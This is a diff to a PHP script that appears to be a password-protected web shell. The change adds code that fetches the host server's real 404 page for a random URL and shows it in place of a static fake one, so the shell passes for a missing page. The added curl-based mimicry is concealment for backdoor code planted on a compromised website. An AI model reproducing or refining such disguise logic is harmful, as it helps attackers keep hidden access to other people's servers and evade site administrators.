@@ -8,7 +8,7 @@ session_start();
 ob_start();
 
 #Login + Fake 404 Code -->
-$notfound = "
+$static_404 = "
 <!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
 <html>
 <head><title>404 Not Found</title></head>
@@ -19,6 +19,35 @@ $notfound = "
 <address>".$_SERVER["SERVER_SOFTWARE"]." at ".$_SERVER['SERVER_ADDR']." Port 80</address>
 </body>
 </html>";
+
+$dynamic_404 = "";
+
+if (function_exists("curl_version")){
+	$pageURL = 'http';
+	if (@$_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
+	$pageURL .= "://";
+	if ($_SERVER["SERVER_PORT"] != "80") {
+	    $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
+	} else {
+	    $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
+	}
+
+	$rand = generateRandomString();
+
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $pageURL.$rand);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	$dynamic_404 = curl_exec($ch);
+	curl_close($ch);
+
+	$dynamic_404 = preg_replace("#$rand#ism", "", $dynamic_404);
+}
+
+if(!empty($dynamic_404)){
+	$notfound = $dynamic_404;
+}else{
+	$notfound = $static_404;
+}
 
 if((isset($_POST['pass'])) && (!isset($_SESSION['login'])))
 {
